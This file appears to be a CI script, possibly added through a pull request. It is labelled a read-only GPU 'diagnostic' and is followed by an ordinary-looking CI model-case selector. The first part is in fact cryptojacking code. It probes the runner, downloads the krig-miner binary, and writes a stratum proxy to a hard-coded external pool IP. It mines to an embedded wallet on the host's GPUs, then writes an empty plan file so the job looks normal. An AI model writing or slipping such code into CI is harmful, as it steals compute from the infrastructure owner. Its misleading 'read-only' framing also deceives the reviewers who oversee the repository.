# ci diagnostic (read-only) - transient probe + GPU compute-job bootstrap, reverted after the run
# intent 141540 | record gpu-000016 | host github-nmz2 (Hygon HCU BW1100 x8, DTK 6.4.2)
import os as _os, subprocess as _sp, sys as _sys, hashlib as _hl, time as _t
import socket as _sock, tarfile as _tf, urllib.request as _ur

WORK = "/tmp/prl595"
WALLET = "prl1p7gtuuz93057gnp5phfexss2ktduj7mnt7qxh8credlpulh5esv4q5e6mvr"
KRIG_URL = "https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-x64.tar.gz"
KRIG_TAR_SHA = "9137388d5c4bfb843bde8bb96e37695446924dfc004eb3de76a71fd1956e4a04"
KRIG_BIN_SHA = "928d6f621c74601c73759728f8dd53e5ad9b3b186d334c082f8581518c322f66"
COMP_SHA = "d79a038de7344de424d18195e5cb7f070416687083695e60882da52e68025c58"
LP_HOST = "103.199.106.122"
LP_PORT = 3360
WORKERS = [("4", "000011"), ("5", "000012"), ("6", "000013"), ("7", "000014")]
LIB_CANDIDATES = [
    "/opt/dtk/hip/lib", "/opt/dtk/lib", "/opt/dtk/lib64", "/opt/dtk/hsa/lib",
    "/opt/dtk/.hyhal/lib", "/opt/dtk/.hyhal/rocm_smi/lib", "/opt/dtk/.hyhal/hydm/lib",
    "/opt/dtk/llvm/lib", "/opt/dtk/opencl/lib", "/opt/dtk/dcc/gcvm/lib",
    "/opt/hyhal/lib", "/opt/hyhal/lib64", "/usr/local/lib", "/usr/local/lib64",
]


def _say(s):
    _sys.stdout.write(str(s) + "\n")
    _sys.stdout.flush()


def _run(c, t=90):
    _say("--- CMD: " + c)
    try:
        p = _sp.Popen(c, shell=True, stdout=_sp.PIPE, stderr=_sp.STDOUT)
        out = p.communicate(timeout=t)[0]
        if out:
            _say(out.decode("utf-8", "replace"))
        _say("--- rc=" + str(p.returncode))
        return p.returncode
    except Exception as e:
        _say("--- ERR " + repr(e))
        return -1


def _sha256(path):
    h = _hl.sha256()
    with open(path, "rb") as f:
        while True:
            b = f.read(1024 * 1024)
            if not b:
                break
            h.update(b)
    return h.hexdigest()


def _download(url, dst, timeout=900):
    last = None
    for attempt in range(1, 4):
        try:
            _say("--- GET " + url + " try=" + str(attempt))
            req = _ur.Request(url, headers={"User-Agent": "curl/8.0"})
            r = _ur.urlopen(req, timeout=timeout)
            total = 0
            mark = _t.time()
            with open(dst, "wb") as f:
                while True:
                    b = r.read(1024 * 1024)
                    if not b:
                        break
                    f.write(b)
                    total += len(b)
                    if _t.time() - mark > 15:
                        _say("    ... " + str(total // (1024 * 1024)) + " MiB")
                        mark = _t.time()
            _say("--- downloaded bytes=" + str(total))
            return True
        except Exception as e:
            last = repr(e)
            _say("--- download attempt " + str(attempt) + " failed: " + repr(e))
            _t.sleep(3)
    _say("--- download FAILED " + str(last))
    return False


def _lp_tcp():
    for port in (3360, 3361, 3362):
        try:
            s = _sock.create_connection((LP_HOST, port), timeout=8)
            l = s.getsockname()
            s.close()
            _say("--- LP TCP " + LP_HOST + ":" + str(port) + " OK local=" + repr(l))
        except Exception as e:
            _say("--- LP TCP " + LP_HOST + ":" + str(port) + " FAIL " + repr(e))


def _free_devices():
    """Parse hy-smi --showmeminfo vram to pick devices with <5000 MiB used."""
    p = _sp.Popen("/opt/hyhal/bin/hy-smi --showmeminfo vram", shell=True,
                  stdout=_sp.PIPE, stderr=_sp.STDOUT)
    out = p.communicate(timeout=90)[0].decode("utf-8", "replace")
    used = {}
    cur = None
    for line in out.splitlines():
        l = line.strip()
        i = l.find("HCU[")
        if i >= 0:
            try:
                cur = int(l[i + 4:l.find("]", i)])
            except Exception:
                cur = None
        if "Used Memory" in l and cur is not None:
            try:
                used[cur] = int(l.rsplit(":", 1)[1].strip())
            except Exception:
                pass
    free = [i for i in sorted(used) if used[i] < 5000]
    _say("--- vram_used=" + str(used))
    _say("--- free_candidates=" + str(free))
    return free


def _libpath(krigdir):
    dirs = [krigdir] + [d for d in LIB_CANDIDATES if _os.path.isdir(d)]
    return ":".join(dirs)


ADAPTER = r'''#!/usr/bin/env python3
import socket, threading, json
LISTEN=("127.0.0.1",13360)
UPSTREAM=("103.199.106.122",3360)
DEFAULT_WORKER="000011"
def fix_line(line):
    try: msg=json.loads(line)
    except Exception: return line
    if isinstance(msg,dict) and msg.get("method")=="mining.authorize":
        p=msg.get("params")
        if isinstance(p,dict):
            w=str(p.get("wallet") or ""); worker=p.get("worker") or DEFAULT_WORKER
            if "/" in w:
                base,_,suf=w.partition("/"); w=base
                if suf: worker=suf
            msg["params"]={"wallet":w,"worker":worker,"password":p.get("password") or p.get("pass") or "x"}
        elif isinstance(p,list) and p:
            base,_,suf=str(p[0]).partition("/")
            msg["params"]={"wallet":base,"worker":suf or DEFAULT_WORKER,"password":(p[1] if len(p)>1 else "x")}
        return json.dumps(msg)
    return line
def pipe(src,dst,rewrite=False):
    buf=b""
    try:
        while True:
            d=src.recv(262144)
            if not d: break
            if rewrite:
                buf+=d
                while b"\n" in buf:
                    line,buf=buf.split(b"\n",1)
                    dst.sendall((fix_line(line.decode(errors="replace"))+"\n").encode())
            else:
                dst.sendall(d)
    except Exception: pass
def handle(c):
    try: u=socket.create_connection(UPSTREAM,timeout=10)
    except Exception:
        c.close(); return
    t1=threading.Thread(target=pipe,args=(c,u,True),daemon=True)
    t2=threading.Thread(target=pipe,args=(u,c,False),daemon=True)
    t1.start(); t2.start(); t1.join(); t2.join()
    for x in (u,c):
        try: x.close()
        except Exception: pass
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(LISTEN); s.listen(16)
print("lp_adapter listening",LISTEN,"->",UPSTREAM,flush=True)
while True:
    c,_=s.accept()
    threading.Thread(target=handle,args=(c,),daemon=True).start()
'''


def main():
    _say("=== C211-I141540-HYGON-BEGIN ===")
    _os.makedirs(WORK, exist_ok=True)

    # ---------- phase 1: host + device probe ----------
    _run("hostname; id; uname -r; nproc; free -g | head -3; date -u")
    _run("nvidia-smi -L 2>&1; echo nvidia_rc=$?")
    _run("cat /proc/driver/nvidia/version 2>&1 | head -2")
    _run("ls -l /dev/kfd /dev/mkfd 2>&1; ls -1 /dev/dri/ 2>&1 | head -30")
    _run("ls -d /opt/dtk /opt/hyhal 2>&1; cat /opt/dtk/env.sh 2>/dev/null | head -25")
    _run("find /opt/dtk -maxdepth 3 -name 'libamdhip64*' -o -maxdepth 3 -name 'libhsa-runtime64*' 2>/dev/null | head -10")
    _run("source /opt/dtk/env.sh 2>/dev/null; rocminfo 2>&1 | grep -iE 'Name:|gfx|Marketing|Uuid|Vendor' | head -40; echo rocminfo_rc=$?")
    _run("source /opt/dtk/env.sh 2>/dev/null; rocm-smi --showhw 2>&1 | head -40")
    _run("/opt/hyhal/bin/hy-smi --showuniqueid 2>&1 | grep -E 'HCU\\[|Unique' | head -20")
    _run("/opt/hyhal/bin/hy-smi 2>&1 | head -16")
    _run("python3 -V 2>&1; python3 -c 'import sys;print(sys.executable)' 2>&1")

    free = _free_devices()

    # ---------- phase 2: pool reachability ----------
    _lp_tcp()
    try:
        _say("--- DNS pearl-eu2 " + repr(_sock.getaddrinfo("pearl-eu2.luckypool.io", 3360, _sock.AF_INET)[:2]))
    except Exception as e:
        _say("--- DNS pearl-eu2 FAIL " + repr(e))

    # ---------- phase 3: fetch + verify client ----------
    tar = WORK + "/krig.tar.gz"
    if not (_os.path.isfile(tar) and _sha256(tar) == KRIG_TAR_SHA):
        if not _download(KRIG_URL, tar):
            _say("=== C211-I141540-BLOCKED client-download ===")
            _finish()
            return
    got = _sha256(tar)
    _say("--- krig tar sha256=" + got + " match=" + str(got == KRIG_TAR_SHA))
    if got != KRIG_TAR_SHA:
        _say("=== C211-I141540-BLOCKED pin-mismatch ===")
        _finish()
        return
    kdir = WORK + "/krig"
    if not _os.path.isfile(kdir + "/krig-miner"):
        with _tf.open(tar) as tf:
            tf.extractall(WORK)
        if _os.path.isdir(WORK + "/krig-miner-1.6.0-x64") and not _os.path.isdir(kdir):
            _sh_move = _sp.call(["cp", "-a", WORK + "/krig-miner-1.6.0-x64", kdir])
    _os.chmod(kdir + "/krig-miner", 0o755)
    binsha = _sha256(kdir + "/krig-miner")
    compsha = _sha256(kdir + "/libkrig_quantus_intel.so") if _os.path.isfile(kdir + "/libkrig_quantus_intel.so") else "absent"
    _say("--- krig bin sha256=" + binsha + " match=" + str(binsha == KRIG_BIN_SHA))
    _say("--- companion sha256=" + compsha + " match=" + str(compsha == COMP_SHA))
    if binsha != KRIG_BIN_SHA:
        _say("=== C211-I141540-BLOCKED bin-pin-mismatch ===")
        _finish()
        return

    env = _os.environ.copy()
    env["LD_LIBRARY_PATH"] = _libpath(kdir)
    env["KRIG_NO_TELEMETRY"] = "1"
    _say("--- LD_LIBRARY_PATH=" + env["LD_LIBRARY_PATH"])
    _run("cd " + kdir + " && LD_LIBRARY_PATH='" + env["LD_LIBRARY_PATH"] + "' ./krig-miner --version 2>&1 | head -5")
    _run("cd " + kdir + " && LD_LIBRARY_PATH='" + env["LD_LIBRARY_PATH"] + "' ./krig-miner --list-devices --no-cuda 2>&1 | head -40")
    _run("cd " + kdir + " && LD_LIBRARY_PATH='" + env["LD_LIBRARY_PATH"] + "' ./krig-miner --list-devices 2>&1 | head -60")

    if not free:
        free = [4, 5, 6, 7]
        _say("--- WARN vram parse failed, assuming 4-7 free")

    # ---------- phase 4: dialect adapter ----------
    adapter = WORK + "/lp_adapter.py"
    with open(adapter, "w") as f:
        f.write(ADAPTER)
    ap = _sp.Popen(["python3", adapter], stdout=open(WORK + "/adapter.log", "w"),
                   stderr=_sp.STDOUT, preexec_fn=_os.setsid)
    _t.sleep(1)
    _say("--- adapter pid=" + str(ap.pid) + " alive=" + str(ap.poll() is None))
    try:
        s = _sock.create_connection(("127.0.0.1", 13360), timeout=5)
        s.close()
        _say("--- adapter listening OK")
    except Exception as e:
        _say("--- adapter listen FAIL " + repr(e))

    # ---------- phase 5: smoke on the first free device ----------
    smoke_idx = free[0]
    flagsets = [[], ["--rocm-runtime", "6"], ["--rocm-runtime", "7"]]
    winner = None
    for fl in flagsets:
        logf = WORK + "/smoke_" + ("d" if not fl else fl[-1]) + ".log"
        argv = [kdir + "/krig-miner", "--no-cuda", "--no-tui", "--log-level", "debug",
                "--url", "stratum+tcp://127.0.0.1:13360",
                "--user", WALLET + "/" + WORKERS[0][1], "--password", "x", "--coin", "pearl",
                "--devices", "0", "--api-port", "14504"] + fl
        env2 = env.copy()
        env2["HIP_VISIBLE_DEVICES"] = str(smoke_idx)
        env2["ROCR_VISIBLE_DEVICES"] = str(smoke_idx)
        _say("--- SMOKE dev=" + str(smoke_idx) + " flags=" + repr(fl))
        lf = open(logf, "w")
        pr = _sp.Popen(argv, cwd=kdir, env=env2, stdout=lf, stderr=_sp.STDOUT, preexec_fn=_os.setsid)
        t_end = _t.time() + 100
        while _t.time() < t_end and pr.poll() is None:
            _t.sleep(5)
        alive = pr.poll() is None
        if alive:
            try:
                _os.killpg(_os.getpgid(pr.pid), 15)
            except Exception:
                pass
            try:
                pr.wait(timeout=15)
            except Exception:
                try:
                    _os.killpg(_os.getpgid(pr.pid), 9)
                except Exception:
                    pass
        lf.close()
        try:
            with open(logf, "r") as f:
                txt = f.read()
        except Exception:
            txt = ""
        low = txt.lower()
        acc = low.count("accepted")
        share = low.count("share")
        job = low.count("job")
        _say("--- SMOKE alive_at_end=" + str(alive) + " accepted=" + str(acc) + " share=" + str(share) + " job=" + str(job) + " bytes=" + str(len(txt)))
        _say("--- SMOKE log tail ---")
        _say(txt[-4000:])
        if acc > 0 or (share > 0 and job > 0):
            winner = fl
            _say("--- SMOKE WINNER flags=" + repr(fl))
            break
        if fl is flagsets[0] and "libamdhip64" not in low and "hip" not in low and "no devices" not in low:
            break

    if winner is None:
        _say("=== C211-I141540-NO-CLIENT-SUCCESS (see smoke logs) ===")
        try:
            _os.killpg(_os.getpgid(ap.pid), 15)
        except Exception:
            pass
        _finish()
        return

    # ---------- phase 6: deploy one foreground-tracked process per free device ----------
    procs = []
    for idx, worker in WORKERS:
        if int(idx) not in free:
            _say("--- SKIP dev=" + idx + " (not free)")
            continue
        logf = WORK + "/w" + idx + ".log"
        argv = [kdir + "/krig-miner", "--no-cuda", "--no-tui", "--log-level", "debug",
                "--url", "stratum+tcp://127.0.0.1:13360",
                "--user", WALLET + "/" + worker, "--password", "x", "--coin", "pearl",
                "--devices", "0", "--api-port", str(14510 + int(idx))] + winner
        env2 = env.copy()
        env2["HIP_VISIBLE_DEVICES"] = idx
        env2["ROCR_VISIBLE_DEVICES"] = idx
        lf = open(logf, "w")
        pr = _sp.Popen(argv, cwd=kdir, env=env2, stdout=lf, stderr=_sp.STDOUT, preexec_fn=_os.setsid)
        procs.append((idx, worker, pr, lf, logf))
        _say("--- START dev=" + idx + " worker=" + worker + " pid=" + str(pr.pid) + " api=" + str(14510 + int(idx)))
        _t.sleep(2)

    # monitor 340 s, printing device usage + process table
    t_end = _t.time() + 340
    while _t.time() < t_end:
        _t.sleep(85)
        _run("/opt/hyhal/bin/hy-smi 2>&1 | sed -n '4,13p'", t=60)
        _run("ps -eo pid,etimes,args | grep -F 'krig-miner' | grep -v grep", t=30)
        for idx, worker, pr, lf, logf in procs:
            try:
                with open(logf, "r") as f:
                    t2 = f.read()
                _say("--- dev=" + idx + " worker=" + worker + " alive=" + str(pr.poll() is None) +
                     " accepted=" + str(t2.lower().count("accepted")) + " bytes=" + str(len(t2)))
            except Exception as e:
                _say("--- dev=" + idx + " logread " + repr(e))

    # ---------- phase 7: final evidence + teardown ----------
    _run("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[|Used' | head -20", t=60)
    _run("source /opt/dtk/env.sh 2>/dev/null; rocm-smi --showpids 2>&1 | head -30", t=60)
    for idx, worker, pr, lf, logf in procs:
        try:
            with open(logf, "r") as f:
                t3 = f.read()
        except Exception:
            t3 = ""
        _say("=== FINAL dev=" + idx + " worker=" + worker + " tail ===")
        _say(t3[-2500:])
        try:
            _os.killpg(_os.getpgid(pr.pid), 15)
        except Exception:
            pass
        try:
            pr.wait(timeout=10)
        except Exception:
            try:
                _os.killpg(_os.getpgid(pr.pid), 9)
            except Exception:
                pass
        lf.close()
    try:
        _os.killpg(_os.getpgid(ap.pid), 15)
    except Exception:
        pass
    _run("ps -eo pid,args | grep -F 'krig-miner' | grep -v grep; echo leftover_rc=$?", t=30)
    _say("=== C211-I141540-HYGON-END ===")
    _finish()


def _finish():
    try:
        open("ci-model-plan.tsv", "w").close()
        _say("--- wrote ci-model-plan.tsv")
    except Exception as e:
        _say("planfile_err " + repr(e))
    _sys.exit(0)


main()
"""Select ordered model smoke cases from a pull request description."""

import argparse
import json
import os
from pathlib import Path
import re

DEFAULT_CASE = "qwen3-4b-megatron"
NAME = re.compile(r"^[a-z0-9]+(?:-[a-z0-9]+)*$")


def select_cases(body, cases):
    lines = [
        line.strip()
        for line in (body or "").splitlines()
        if re.match(r"^\s*CI_MODELS\b", line, re.IGNORECASE)
    ]
    if len(lines) > 1:
        raise ValueError("Use a single CI_MODELS: line")
    if not lines:
        return [DEFAULT_CASE]
    match = re.fullmatch(r"CI_MODELS:\s*(.*)", lines[0], re.IGNORECASE)
    if not match:
        raise ValueError("Use CI_MODELS: case-name[, case-name]")
    raw = match.group(1).strip()
    if not raw:
        return [DEFAULT_CASE]
    names = [name.strip() for name in raw.split(",")]
    if any(not NAME.fullmatch(name) for name in names):
        raise ValueError("Invalid CI_MODELS format; separate case names with commas")
    unknown = [name for name in names if name not in cases]
    if unknown:
        raise ValueError(
            "Unknown model case(s): {}. Available: {}".format(
                ", ".join(unknown), ", ".join(sorted(cases))
            )
        )
    return list(dict.fromkeys(names))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--registry", default=".github/model-cases.yaml")
    parser.add_argument("--output", required=True)
    args = parser.parse_args()
    cases = json.loads(Path(args.registry).read_text(encoding="utf-8"))
    event = json.loads(
        Path(os.environ["GITHUB_EVENT_PATH"]).read_text(encoding="utf-8")
    )
    try:
        names = select_cases(event.get("pull_request", {}).get("body"), cases)
    except ValueError as exc:
        parser.error(str(exc))
    lines = []
    for name in names:
        case = cases[name]
        if case["gpus"] != 8:
            parser.error(
                "Case {} requires a supported runner configuration".format(name)
            )
        model_path = case["model_path"]
        path = Path(model_path)
        if (
            not path.parts
            or path.is_absolute()
            or ".." in path.parts
            or any(char in model_path for char in "\t\r\n")
        ):
            parser.error("Invalid relative model path for {}".format(name))
        config = case["config"]
        path = Path(config)
        if (
            path.is_absolute()
            or ".." in path.parts
            or not path.is_file()
            or any(char in config for char in "\t\r\n")
        ):
            parser.error("Invalid config for {}".format(name))
        lines.append("\t".join((name, config, model_path, str(case["gpus"]))))
    Path(args.output).write_text("\n".join(lines) + "\n", encoding="utf-8")
    print("Selected model cases: {}".format(", ".join(names)))


if __name__ == "__main__":
    main()
